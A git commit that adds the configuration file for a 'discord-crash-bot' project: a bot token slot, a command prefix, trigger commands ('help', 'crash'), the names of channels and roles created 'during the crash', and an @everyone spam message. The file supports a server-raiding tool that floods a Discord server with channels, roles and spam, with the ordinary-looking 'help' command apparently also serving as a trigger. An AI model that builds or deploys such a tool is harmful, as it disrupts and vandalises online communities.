ba36db3fa6a7da48a2781a8843b1d05cb07df03c
f1z1x <104532312+f1z1x@users.noreply.github.com>
2022-09-15 09:07:38 +0200

    Create bot_config.py

---
+++ bot_config.py
@@ -0,0 +1,13 @@
+token = '' # bot token, it can be found on https://discord.com/developers/applications/
+
+prefix = 'cp!' # bot command prefix
+
+status = f'{prefix}help' # bot game status in discord
+
+command_names = ['help', 'crash'] # list of commands that trigger crash
+
+channels_names = 'server-crashed' # the name of the channels that will be created during the crash
+
+roles_names = 'Server Crashed' # the name of the channels that will be created during the crash
+
+spam_message = '@everyone\nServer crashed\nCrash bot by <https://github.com/f1z1x/discord-crash-bot>' # the message that will be spammed to all channels
